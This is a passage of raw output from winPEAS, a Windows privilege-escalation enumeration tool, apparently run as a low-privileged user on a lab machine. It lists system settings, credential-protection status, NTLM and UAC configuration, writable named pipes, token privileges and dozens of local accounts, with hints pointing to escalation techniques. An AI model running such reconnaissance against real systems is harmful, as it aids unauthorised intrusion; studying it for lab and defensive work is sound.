+       |         Get the latest version    :     https://github.com/sponsors/carlospolop |                    
+       |         Follow on Twitter         :     @carlospolopm                           |                    
+       |         Respect on HTB            :     SirBroccoli                             |                    
+       |---------------------------------------------------------------------------------|                    
+       |                                 Thank you!                                      |                    
+       \---------------------------------------------------------------------------------/                    
+                                                                                                              
+  [+] Legend:
+         Red                Indicates a special privilege over an object or something is misconfigured
+         Green              Indicates that some protection is enabled or something is well configured
+         Cyan               Indicates active users
+         Blue               Indicates disabled users
+         LightYellow        Indicates links
+
+È You can find a Windows local PE Checklist here: https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation                                                                                      
+   Creating Dynamic lists, this could take a while, please wait...
+   - Loading sensitive_files yaml definitions file...
+   - Loading regexes yaml definitions file...
+   - Checking if domain...
+   - Getting Win32_UserAccount info...
+Error while getting Win32_UserAccount info: System.Management.ManagementException: Access denied
+   at System.Management.ThreadDispatch.Start()                                                                
+   at System.Management.ManagementScope.Initialize()                                                          
+   at System.Management.ManagementObjectSearcher.Initialize()                                                 
+   at System.Management.ManagementObjectSearcher.Get()                                                        
+   at winPEAS.Checks.Checks.c()                                                                               
+   - Creating current user groups list...
+   - Creating active users list (local only)...
+  [X] Exception: Object reference not set to an instance of an object.
+   - Creating disabled users list...
+  [X] Exception: Object reference not set to an instance of an object.
+   - Admin users list...
+  [X] Exception: Object reference not set to an instance of an object.
+   - Creating AppLocker bypass list...
+   - Creating files/directories list for search...
+
+ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ System Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Basic System Information
+È Check if the Windows versions is vulnerable to some known exploit https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#kernel-exploits                                                        
+  [X] Exception: Access denied 
+  [X] Exception: Access denied 
+  [X] Exception: The given key was not present in the dictionary.
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing All Microsoft Updates
+  [X] Exception: Creating an instance of the COM component with CLSID {B699E5E8-67FF-4177-88B0-3684A3388BFB} from the IClassFactory failed due to the following error: 80070005 Access is denied. (Exception from HRESULT: 0x80070005 (E_ACCESSDENIED)).                                                                                  
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ System Last Shutdown Date/time (from Registry)
+                                                                                                              
+    Last Shutdown Date/time        :    7/30/2020 1:33:25 AM
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ User Environment Variables
+È Check for some passwords or keys in the env variables 
+    COMPUTERNAME: SET
+    USERPROFILE: C:\Users\MichelleWat
+    HOMEPATH: \Users\MichelleWat
+    LOCALAPPDATA: C:\Users\MichelleWat\AppData\Local
+    PSModulePath: C:\Users\MichelleWat\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShell\Modules;C:\windows\system32\WindowsPowerShell\v1.0\Modules
+    PROCESSOR_ARCHITECTURE: AMD64
+    Path: C:\windows\system32;C:\windows;C:\windows\System32\Wbem;C:\windows\System32\WindowsPowerShell\v1.0\;C:\windows\System32\OpenSSH\;C:\Program Files\Microsoft\Web Platform Installer\;C:\Users\MichelleWat\AppData\Local\Microsoft\WindowsApps
+    CommonProgramFiles(x86): C:\Program Files (x86)\Common Files
+    ProgramFiles(x86): C:\Program Files (x86)
+    PROCESSOR_LEVEL: 6
+    LOGONSERVER: \\SET
+    PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL
+    HOMEDRIVE: C:
+    SystemRoot: C:\windows
+    ALLUSERSPROFILE: C:\ProgramData
+    DriverData: C:\Windows\System32\Drivers\DriverData
+    APPDATA: C:\Users\MichelleWat\AppData\Roaming
+    PROCESSOR_REVISION: 3f02
+    USERNAME: MichelleWat
+    CommonProgramW6432: C:\Program Files\Common Files
+    CommonProgramFiles: C:\Program Files\Common Files
+    OS: Windows_NT
+    USERDOMAIN_ROAMINGPROFILE: SET
+    PROCESSOR_IDENTIFIER: Intel64 Family 6 Model 63 Stepping 2, GenuineIntel
+    ComSpec: C:\windows\system32\cmd.exe
+    SystemDrive: C:
+    TEMP: C:\Users\MICHEL~1\AppData\Local\Temp
+    ProgramFiles: C:\Program Files
+    NUMBER_OF_PROCESSORS: 1
+    __PSLockdownPolicy: 4
+    TMP: C:\Users\MICHEL~1\AppData\Local\Temp
+    ProgramData: C:\ProgramData
+    ProgramW6432: C:\Program Files
+    windir: C:\windows
+    USERDOMAIN: SET
+    PUBLIC: C:\Users\Public
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ System Environment Variables
+È Check for some passwords or keys in the env variables 
+    __PSLockdownPolicy: 4
+    ComSpec: C:\windows\system32\cmd.exe
+    DriverData: C:\Windows\System32\Drivers\DriverData
+    NUMBER_OF_PROCESSORS: 1
+    OS: Windows_NT
+    Path: C:\windows\system32;C:\windows;C:\windows\System32\Wbem;C:\windows\System32\WindowsPowerShell\v1.0\;C:\windows\System32\OpenSSH\;C:\Program Files\Microsoft\Web Platform Installer\
+    PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
+    PROCESSOR_ARCHITECTURE: AMD64
+    PROCESSOR_IDENTIFIER: Intel64 Family 6 Model 63 Stepping 2, GenuineIntel
+    PROCESSOR_LEVEL: 6
+    PROCESSOR_REVISION: 3f02
+    PSModulePath: C:\Program Files\WindowsPowerShell\Modules;C:\windows\system32\WindowsPowerShell\v1.0\Modules
+    TEMP: C:\windows\TEMP
+    TMP: C:\windows\TEMP
+    USERNAME: SYSTEM
+    windir: C:\windows
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Audit Settings
+È Check what is being logged 
+    Not Found
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Audit Policy Settings - Classic & Advanced
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ WEF Settings
+È Windows Event Forwarding, is interesting to know were are sent the logs 
+    Not Found
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ LAPS Settings
+È If installed, local administrator password is changed frequently and is restricted by ACL 
+    LAPS Enabled: LAPS not installed
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Wdigest
+È If enabled, plain-text crds could be stored in LSASS https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-protections#wdigest                                                                   
+    Wdigest is not enabled
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ LSA Protection
+È If enabled, a driver is needed to read LSASS memory (If Secure Boot or UEFI, RunAsPPL cannot be disabled by deleting the registry key) https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-protections#lsa-protection                                                                                        
+    LSA Protection is not enabled
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Credentials Guard
+È If enabled, a driver is needed to read LSASS memory https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-protections#credential-guard                                                           
+    CredentialGuard is not enabled
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Cached Creds
+È If > 0, credentials will be cached in the registry and accessible by SYSTEM user https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-protections#cached-credentials                            
+    cachedlogonscount is 10
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating saved credentials in Registry (CurrentPass)
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ AV Information
+  [X] Exception: Invalid namespace 
+    No AV was detected!!
+    Not Found
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Windows Defender configuration
+  Local Settings
+  Group Policy Settings
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ UAC Status
+È If you are in the Administrators group check how to bypass the UAC https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#basic-uac-bypass-full-file-system-access                              
+    ConsentPromptBehaviorAdmin: 5 - PromptForNonWindowsBinaries
+    EnableLUA: 1
+    LocalAccountTokenFilterPolicy: 
+    FilterAdministratorToken: 
+      [*] LocalAccountTokenFilterPolicy set to 0 and FilterAdministratorToken != 1.
+      [-] Only the RID-500 local admin account can be used for lateral movement.                              
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ PowerShell Settings
+    PowerShell v2 Version: 2.0
+    PowerShell v5 Version: 5.1.17763.1
+    PowerShell Core Version: 
+    Transcription Settings: 
+    Module Logging Settings: 
+    Scriptblock Logging Settings: 
+    PS history file: 
+    PS history size: 
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating PowerShell Session Settings using the registry
+      You must be an administrator to run this check
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ PS default transcripts history
+È Read the PS history inside these files (if any)
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ HKCU Internet Settings
+    DisableCachingOfSSLPages: 1
+    IE5_UA_Backup_Flag: 5.0
+    PrivacyAdvanced: 1
+    SecureProtocols: 2688
+    User Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+    CertificateRevocation: 1
+    ZonesSecurityUpgrade: System.Byte[]
+    EnableNegotiate: 1
+    MigrateProxy: 1
+    ProxyEnable: 0
+    WarnonZoneCrossing: 1
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ HKLM Internet Settings
+    ActiveXCache: C:\Windows\Downloaded Program Files
+    CodeBaseSearchPath: CODEBASE
+    EnablePunycode: 1
+    MinorVersion: 0
+    WarnOnIntranet: 1
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Drives Information
+È Remember that you should search more info inside the other drives 
+    C:\ (Type: Fixed)(Filesystem: NTFS)(Available space: 23 GB)(Permissions: Users [AppendData/CreateDirectories])                                                                                                          
+    E:\ (Type: Fixed)(Filesystem: FAT32)(Available space: 0 GB)(Permissions: Everyone [AllAccess])
+    F:\ (Type: Fixed)
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking WSUS
+È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#wsus
+    Not Found
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking KrbRelayUp
+È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#krbrelayup
+  The system isn't inside a domain, so it isn't vulnerable
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking If Inside Container
+È If the binary cexecsvc.exe or associated service exists, you are inside Docker 
+You are NOT inside a container
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking AlwaysInstallElevated
+È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#alwaysinstallelevated
+    AlwaysInstallElevated isn't available
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerate LSA settings - auth packages included
+                                                                                                              
+    auditbasedirectories                 :       0
+    auditbaseobjects                     :       0
+    Bounds                               :       00-30-00-00-00-20-00-00
+    crashonauditfail                     :       0
+    fullprivilegeauditing                :       00
+    LimitBlankPasswordUse                :       1
+    NoLmHash                             :       1
+    Security Packages                    :       ""
+    Notification Packages                :       rassfm,scecli
+    Authentication Packages              :       msv1_0
+    LsaPid                               :       788
+    LsaCfgFlagsDefault                   :       0
+    SecureBoot                           :       1
+    ProductType                          :       7
+    disabledomaincreds                   :       0
+    everyoneincludesanonymous            :       0
+    forceguest                           :       0
+    restrictanonymous                    :       0
+    restrictanonymoussam                 :       1
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating NTLM Settings
+  LanmanCompatibilityLevel    :  (Send NTLMv2 response only - Win7+ default)
+                                                                                                              
+
+  NTLM Signing Settings                                                                                       
+      ClientRequireSigning    : False
+      ClientNegotiateSigning  : True
+      ServerRequireSigning    : False
+      ServerNegotiateSigning  : False
+      LdapSigning             : Negotiate signing (Negotiate signing)
+
+  Session Security                                                                                            
+      NTLMMinClientSec        : 536870912 (Require 128-bit encryption)
+      NTLMMinServerSec        : 536870912 (Require 128-bit encryption)
+                                                                                                              
+
+  NTLM Auditing and Restrictions                                                                              
+      InboundRestrictions     :  (Not defined)
+      OutboundRestrictions    :  (Not defined)
+      InboundAuditing         :  (Not defined)
+      OutboundExceptions      :
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Display Local Group Policy settings - local users/machine
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking AppLocker effective policy
+   AppLockerPolicy version: 1
+   listing rules:
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Printers (WMI)
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Named Pipes
+  Name                                                                                                 CurrentUserPerms                                                       Sddl
+
+  eventlog                                                                                             Everyone [WriteData/CreateFiles]                                       O:LSG:LSD:P(A;;0x12019b;;;WD)(A;;CC;;;OW)(A;;0x12008f;;;S-1-5-80-880578595-1860270145-482643319-2788375705-1540778122)
+
+  ROUTER                                                                                               Everyone [WriteData/CreateFiles]                                       O:SYG:SYD:P(A;;0x12019b;;;WD)(A;;0x12019b;;;AN)(A;;FA;;;SY)
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating AMSI registered providers
+    Provider:       {2781761E-28E0-4109-99FE-B9D127C57AFE}
+    Path:           "C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2006.10-0\MpOav.dll"
+
+   =================================================================================================
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Sysmon configuration
+      You must be an administrator to run this check
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Sysmon process creation logs (1)
+      You must be an administrator to run this check
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Installed .NET versions
+                                                                                                              
+
+ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Interesting Events information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Printing Explicit Credential Events (4648) for last 30 days - A process logged on using plaintext credentials                                                                                                  
+                                                                                                              
+      You must be an administrator to run this check
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Printing Account Logon Events (4624) for the last 10 days.
+                                                                                                              
+      You must be an administrator to run this check
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Process creation events - searching logs (EID 4688) for sensitive data.
+                                                                                                              
+      You must be an administrator to run this check
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ PowerShell events - script block logs (EID 4104) - searching for sensitive data.
+                                                                                                              
+  [X] Exception: Attempted to perform an unauthorized operation.
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Displaying Power off/on events for last 5 days
+                                                                                                              
+System.UnauthorizedAccessException: Attempted to perform an unauthorized operation.
+   at System.Diagnostics.Eventing.Reader.EventLogException.Throw(Int32 errorCode)
+   at System.Diagnostics.Eventing.Reader.NativeWrapper.EvtQuery(EventLogHandle session, String path, String query, Int32 flags)
+   at System.Diagnostics.Eventing.Reader.EventLogReader..ctor(EventLogQuery eventQuery, EventBookmark bookmark)
+   at winPEAS.Helpers.MyUtils.GetEventLogReader(String path, String query, String computerName)
+   at hk.a.b()
+   at in.a()
+
+ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Users Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Users
+È Check if you have some admin equivalent privileges https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#users-and-groups                                                                      
+  [X] Exception: Object reference not set to an instance of an object.
+  Current user: MichelleWat
+  Current groups: Domain Users, Everyone, Builtin\Remote Management Users, Users, Network, Authenticated Users, This Organization, Local account, NTLM Authentication
+   =================================================================================================
+
+    Not Found
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Current User Idle Time
+   Current User   :     SET\MichelleWat
+   Idle Time      :     03h:04m:53s:250ms
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Display Tenant information (DsRegCmd.exe /status)
+   Tenant is NOT Azure AD Joined.
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Current Token privileges
+È Check if you can escalate privilege using some enabled token https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#token-manipulation                                                          
+    SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
+    SeIncreaseWorkingSetPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Clipboard text
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Logged users
+  [X] Exception: Access denied 
+    Not Found
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Display information about local users
+   Computer Name           :   SET
+   User Name               :   AaronWhe
+   User Id                 :   2027
+   Is Enabled              :   True
+   User Type               :   Guest
+   Comment                 :
+   Last Logon              :   1/1/1970 12:00:00 AM
+   Logons Count            :   0
+   Password Last Set       :   6/12/2020 11:22:15 AM
+
+   =================================================================================================
+
+   Computer Name           :   SET
+   User Name               :   AddisonRus
+   User Id                 :   2085
+   Is Enabled              :   True
+   User Type               :   Guest
+   Comment                 :
+   Last Logon              :   1/1/1970 12:00:00 AM
+   Logons Count            :   0
+   Password Last Set       :   6/12/2020 11:22:23 AM
+
+   =================================================================================================
+
+   Computer Name           :   SET
+   User Name               :   Administrator
+   User Id                 :   500
+   Is Enabled              :   True
+   User Type               :   Administrator
+   Comment                 :   Built-in account for administering the computer/domain
+   Last Logon              :   7/30/2020 12:41:34 AM
+   Logons Count            :   39
+   Password Last Set       :   6/15/2020 1:29:26 PM
+
+   =================================================================================================
+
+   Computer Name           :   SET
+   User Name               :   AidenBoy
+   User Id                 :   2039
+   Is Enabled              :   True
+   User Type               :   Guest
+   Comment                 :
+   Last Logon              :   1/1/1970 12:00:00 AM
+   Logons Count            :   0
+   Password Last Set       :   6/12/2020 11:22:16 AM
+
+   =================================================================================================
+
+   Computer Name           :   SET
+   User Name               :   AlicePet
+   User Id                 :   2031
+   Is Enabled              :   True
+   User Type               :   Guest
+   Comment                 :
+   Last Logon              :   1/1/1970 12:00:00 AM
+   Logons Count            :   0
+   Password Last Set       :   6/12/2020 11:22:15 AM
+
+   =================================================================================================
+
+   Computer Name           :   SET
+   User Name               :   AllisonNea
+   User Id                 :   2073
+   Is Enabled              :   True
+   User Type               :   Guest
+   Comment                 :
+   Last Logon              :   1/1/1970 12:00:00 AM
+   Logons Count            :   0
+   Password Last Set       :   6/12/2020 11:22:21 AM
+
+   =================================================================================================
+
+   Computer Name           :   SET
+   User Name               :   AlyssaBak
+   User Id                 :   1978
+   Is Enabled              :   True
+   User Type               :   Guest
+   Comment                 :
+   Last Logon              :   1/1/1970 12:00:00 AM
+   Logons Count            :   0
+   Password Last Set       :   6/12/2020 11:22:08 AM
+
+   =================================================================================================
+
+   Computer Name           :   SET
+   User Name               :   AndreaCur
+   User Id                 :   1989
+   Is Enabled              :   True
+   User Type               :   Guest
+   Comment                 :
+   Last Logon              :   1/1/1970 12:00:00 AM
+   Logons Count            :   0
+   Password Last Set       :   6/12/2020 11:22:09 AM
+
+   =================================================================================================
+
+   Computer Name           :   SET
+   User Name               :   AndreaHar
+   User Id                 :   1985
+   Is Enabled              :   True
+   User Type               :   Guest
+   Comment                 :
+   Last Logon              :   1/1/1970 12:00:00 AM
+   Logons Count            :   0
+   Password Last Set       :   6/12/2020 11:22:09 AM
+
+   =================================================================================================
+
+   Computer Name           :   SET
+   User Name               :   AndreaSte
+   User Id                 :   2048
+   Is Enabled              :   True
+   User Type               :   Guest
+   Comment                 :
+   Last Logon              :   1/1/1970 12:00:00 AM
+   Logons Count            :   0
+   Password Last Set       :   6/12/2020 11:22:18 AM
+
+   =================================================================================================
+
+   Computer Name           :   SET
+   User Name               :   AndrewPow
+   User Id                 :   2017
+   Is Enabled              :   True
+   User Type               :   Guest
+   Comment                 :
+   Last Logon              :   1/1/1970 12:00:00 AM
+   Logons Count            :   0
+   Password Last Set       :   6/12/2020 11:22:13 AM
+
+   =================================================================================================
+
+   Computer Name           :   SET
+   User Name               :   AubreeHop
+   User Id                 :   2004
+   Is Enabled              :   True
+   User Type               :   Guest
+   Comment                 :
+   Last Logon              :   1/1/1970 12:00:00 AM
+   Logons Count            :   0
+   Password Last Set       :   6/12/2020 11:22:11 AM
+
+   =================================================================================================
+
+   Computer Name           :   SET
+   User Name               :   BeckyWel
+   User Id                 :   2040
+   Is Enabled              :   True
+   User Type               :   Guest
+   Comment                 :
+   Last Logon              :   1/1/1970 12:00:00 AM
+   Logons Count            :   0
+   Password Last Set       :   6/12/2020 11:22:17 AM
+
+   =================================================================================================
+
+   Computer Name           :   SET
+   User Name               :   BernardMck
+   User Id                 :   2045
+   Is Enabled              :   True
+   User Type               :   Guest
+   Comment                 :
+   Last Logon              :   1/1/1970 12:00:00 AM
+   Logons Count            :   0
+   Password Last Set       :   6/12/2020 11:22:17 AM
+
+   =================================================================================================
+
+   Computer Name           :   SET
+   User Name               :   BillieHil
+   User Id                 :   1981
+   Is Enabled              :   True
+   User Type               :   Guest
+   Comment                 :
+   Last Logon              :   1/1/1970 12:00:00 AM
+   Logons Count            :   0
+   Password Last Set       :   6/12/2020 11:22:08 AM
+
+   =================================================================================================
+
+   Computer Name           :   SET
+   User Name               :   BillieRya
+   User Id                 :   1997
+   Is Enabled              :   True
+   User Type               :   Guest
+   Comment                 :
+   Last Logon              :   1/1/1970 12:00:00 AM
+   Logons Count            :   0
+   Password Last Set       :   6/12/2020 11:22:10 AM
+
+   =================================================================================================
+
+   Computer Name           :   SET
+   User Name               :   BrandonSpe
+   User Id                 :   2030
+   Is Enabled              :   True
+   User Type               :   Guest
+   Comment                 :
+   Last Logon              :   1/1/1970 12:00:00 AM
+   Logons Count            :   0
+   Password Last Set       :   6/12/2020 11:22:15 AM
+
+   =================================================================================================
+
+   Computer Name           :   SET
+   User Name               :   BrandyRod
+   User Id                 :   1996
+   Is Enabled              :   True
+   User Type               :   Guest
+   Comment                 :
+   Last Logon              :   1/1/1970 12:00:00 AM
+   Logons Count            :   0
+   Password Last Set       :   6/12/2020 11:22:10 AM
+
+   =================================================================================================
+
+   Computer Name           :   SET
+   User Name               :   BraydenHaw
+   User Id                 :   2086
+   Is Enabled              :   True
+   User Type               :   Guest
+   Comment                 :
+   Last Logon              :   1/1/1970 12:00:00 AM
+   Logons Count            :   0
+   Password Last Set       :   6/12/2020 11:22:24 AM
+
+   =================================================================================================
+
+   Computer Name           :   SET
+   User Name               :   BraydenWeb
+   User Id                 :   2038
+   Is Enabled              :   True
+   User Type               :   Guest
+   Comment                 :
+   Last Logon              :   1/1/1970 12:00:00 AM
+   Logons Count            :   0
+   Password Last Set       :   6/12/2020 11:22:16 AM
+
+   =================================================================================================
+
+   Computer Name           :   SET
+   User Name               :   ByronWil
+   User Id                 :   2001
+   Is Enabled              :   True
+   User Type               :   Guest
+   Comment                 :
+   Last Logon              :   1/1/1970 12:00:00 AM
+   Logons Count            :   0
+   Password Last Set       :   6/12/2020 11:22:11 AM
+
+   =================================================================================================
+
+   Computer Name           :   SET
+   User Name               :   CalebRod
+   User Id                 :   2020
+   Is Enabled              :   True
+   User Type               :   Guest
+   Comment                 :
+   Last Logon              :   1/1/1970 12:00:00 AM
+   Logons Count            :   0
+   Password Last Set       :   6/12/2020 11:22:14 AM
+
+   =================================================================================================
+
+   Computer Name           :   SET
+   User Name               :   ChloeWes
+   User Id                 :   2012
+   Is Enabled              :   True
+   User Type               :   Guest
+   Comment                 :
+   Last Logon              :   1/1/1970 12:00:00 AM
+   Logons Count            :   0
+   Password Last Set       :   6/12/2020 11:22:13 AM
+
+   =================================================================================================
+
+   Computer Name           :   SET
+   User Name               :   ChristineRui
+   User Id                 :   2091
+   Is Enabled              :   True
+   User Type               :   Guest
+   Comment                 :
+   Last Logon              :   1/1/1970 12:00:00 AM
+   Logons Count            :   0
+   Password Last Set       :   6/12/2020 11:22:24 AM
+
+   =================================================================================================
+
+   Computer Name           :   SET
+   User Name               :   ClaireHay
+   User Id                 :   1994
+   Is Enabled              :   True
+   User Type               :   Guest
+   Comment                 :
+   Last Logon              :   1/1/1970 12:00:00 AM
+   Logons Count            :   0
+   Password Last Set       :   6/12/2020 11:22:10 AM
+
+   =================================================================================================
+
+   Computer Name           :   SET
+   User Name               :   CraigMcd
+   User Id                 :   2006
+   Is Enabled              :   True
+   User Type               :   Guest
+   Comment                 :
+   Last Logon              :   1/1/1970 12:00:00 AM
+   Logons Count            :   0
+   Password Last Set       :   6/12/2020 11:22:11 AM
+
+   =================================================================================================
+
+   Computer Name           :   SET
+   User Name               :   DanaRos
+   User Id                 :   2032
+   Is Enabled              :   True
+   User Type               :   Guest
+   Comment                 :
+   Last Logon              :   1/1/1970 12:00:00 AM
+   Logons Count            :   0
+   Password Last Set       :   6/12/2020 11:22:15 AM
+
+   =================================================================================================
+
+   Computer Name           :   SET
+   User Name               :   DanielleTho
+   User Id                 :   2050
+   Is Enabled              :   True
+   User Type               :   Guest
+   Comment                 :
+   Last Logon              :   1/1/1970 12:00:00 AM
+   Logons Count            :   0
+   Password Last Set       :   6/12/2020 11:22:18 AM
+
+   =================================================================================================
+
+   Computer Name           :   SET
+   User Name               :   DarrellPea
+   User Id                 :   2089
+   Is Enabled              :   True
+   User Type               :   Guest
+   Comment                 :
+   Last Logon              :   1/1/1970 12:00:00 AM
+   Logons Count            :   0
+   Password Last Set       :   6/12/2020 11:22:24 AM
+
+   =================================================================================================
+
+   Computer Name           :   SET
+   User Name               :   DefaultAccount
+   User Id                 :   503
+   Is Enabled              :   False
+   User Type               :   Guest
+   Comment                 :   A user account managed by the system.
+   Last Logon              :   1/1/1970 12:00:00 AM
+   Logons Count            :   0
+   Password Last Set       :   1/1/1970 12:00:00 AM
+
+   =================================================================================================
+
+   Computer Name           :   SET
+   User Name               :   DonBur
+   User Id                 :   2037
+   Is Enabled              :   True
+   User Type               :   Guest
+   Comment                 :
+   Last Logon              :   1/1/1970 12:00:00 AM
+   Logons Count            :   0
+   Password Last Set       :   6/12/2020 11:22:16 AM
+
+   =================================================================================================
+
+   Computer Name           :   SET
+   User Name               :   DonPer
+   User Id                 :   2002
+   Is Enabled              :   True
+   User Type               :   Guest
+   Comment                 :
+   Last Logon              :   1/1/1970 12:00:00 AM
+   Logons Count            :   0
+   Password Last Set       :   6/12/2020 11:22:11 AM
+
+   =================================================================================================
+
+   Computer Name           :   SET
+   User Name               :   EdnaHow
+   User Id                 :   2021
+   Is Enabled              :   True
+   User Type               :   Guest
+   Comment                 :
+   Last Logon              :   1/1/1970 12:00:00 AM
+   Logons Count            :   0
+   Password Last Set       :   6/12/2020 11:22:14 AM
+
+   =================================================================================================
+
+   Computer Name           :   SET
+   User Name               :   EdnaPer
+   User Id                 :   2016
+   Is Enabled              :   True
+   User Type               :   Guest
+   Comment                 :
+   Last Logon              :   1/1/1970 12:00:00 AM
+   Logons Count            :   0
+   Password Last Set       :   6/12/2020 11:22:13 AM
+
+   =================================================================================================
+
+   Computer Name           :   SET
+   User Name               :   EdnaRey
+   User Id                 :   2094
+   Is Enabled              :   True
+   User Type               :   Guest
+   Comment                 :
+   Last Logon              :   1/1/1970 12:00:00 AM
+   Logons Count            :   0
+   Password Last Set       :   6/12/2020 11:22:25 AM
+
+   =================================================================================================
+
+   Computer Name           :   SET
+   User Name               :   EugeneWoo
+   User Id                 :   2080
+   Is Enabled              :   True
+   User Type               :   Guest
+   Comment                 :
+   Last Logon              :   1/1/1970 12:00:00 AM
+   Logons Count            :   0
+   Password Last Set       :   6/12/2020 11:22:23 AM
+
+   =================================================================================================
+
+   Computer Name           :   SET
+   User Name               :   FernandoHun
+   User Id                 :   1987
+   Is Enabled              :   True
+   User Type               :   Guest
+   Comment                 :
+   Last Logon              :   1/1/1970 12:00:00 AM
+   Logons Count            :   0
+   Password Last Set       :   6/12/2020 11:22:09 AM
+
+   =================================================================================================
+
+   Computer Name           :   SET
+   User Name               :   FlennRod
+   User Id                 :   2087
+   Is Enabled              :   True
+   User Type               :   Guest
+   Comment                 :
+   Last Logon              :   1/1/1970 12:00:00 AM
+   Logons Count            :   0
+   Password Last Set       :   6/12/2020 11:22:24 AM
+
+   =================================================================================================
+
+   Computer Name           :   SET
+   User Name               :   FloydPet
+   User Id                 :   2058
+   Is Enabled              :   True
+   User Type               :   Guest
+   Comment                 :
+   Last Logon              :   1/1/1970 12:00:00 AM
+   Logons Count            :   0
+   Password Last Set       :   6/12/2020 11:22:19 AM
+
+   =================================================================================================
+
+   Computer Name           :   SET
+   User Name               :   GabrielAll
+   User Id                 :   2047
+   Is Enabled              :   True
+   User Type               :   Guest
+   Comment                 :
+   Last Logon              :   1/1/1970 12:00:00 AM
+   Logons Count            :   0
+   Password Last Set       :   6/12/2020 11:22:17 AM
+
+   =================================================================================================
+
+   Computer Name           :   SET
+   User Name               :   GertrudeWil
+   User Id                 :   2095
+   Is Enabled              :   True
+   User Type               :   Guest
+   Comment                 :
+   Last Logon              :   1/1/1970 12:00:00 AM
+   Logons Count            :   0
+   Password Last Set       :   6/12/2020 11:22:25 AM
+
+   =================================================================================================
+
+   Computer Name           :   SET
+   User Name               :   GilbertTay
+   User Id                 :   2051
+   Is Enabled              :   True
+   User Type               :   Guest
+   Comment                 :
+   Last Logon              :   1/1/1970 12:00:00 AM
